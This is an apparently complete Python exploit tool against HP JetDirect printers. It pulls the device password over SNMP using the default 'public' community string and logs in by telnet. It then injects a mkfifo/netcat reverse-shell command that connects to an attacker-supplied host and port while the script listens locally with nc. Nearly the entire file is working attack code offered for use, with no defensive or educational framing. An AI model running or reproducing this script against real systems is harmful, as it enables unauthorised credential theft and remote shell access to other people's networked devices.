!/usr/bin/env python3

import os
import subprocess
import sys 
import argparse
import webbrowser
import time
import getpass
import telnetlib

try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="HP JetDirect Password Finder then Exploit", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-t", "--Target", action="store", help="IP of target")
parser.add_argument("-r", "--RPORT", action="store", help="RPORT ex 9100")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST (attacker IP)")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT (attacker listening port)")
args = parser.parse_args()

Target = args.Target
RPORT = args.RPORT
LHOST = args.LHOST
LPORT = args.LPORT

if (Target == None or RPORT == None):
    print(YELLOW+"What do you want from me!!!"+RESET)
    parser.print_help()
    sys.exit()
    
print(GREEN+'HP JetDirect found, trying to exploit'+RESET)
print(YELLOW+'Dropping password in hex format, hex needed is after BITS'+RESET)
hex_pass = subprocess.run(['snmpget', '-v', '1', '-c', 'public', f'{Target}', '.1.3.6.1.4.1.11.2.3.9.1.1.13.0'], stdout=subprocess.PIPE, text=True)
Password = hex_pass.stdout.split("BITS: ")
Password = bytearray.fromhex(Password[1].replace("\n", "").replace(" ", "")[:34]).decode()
print(f"{RED}Thank you DZE for the help with this part {Password}{RESET}")

if (Target != None and RPORT != None and LHOST != None and LPORT != None and Password != None):
    tn = telnetlib.Telnet(Target)
    print(MAGENTA+"Exploiting to create reverse shell"+RESET)
    print(YELLOW+"Please enter password "+Password+""+RESET)
    tn.write(b"\n")
    time.sleep(1)
    tn.write(Password.encode('ascii') + b"\n")
    code = "exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+LHOST+" "+LPORT+" >/tmp/f"
    tn.write(code.encode('ascii') + b"\n")
    subprocess.run(["nc", "-lvnp", f"{LPORT}"])
    print (tn.read_all().decode('ascii'))
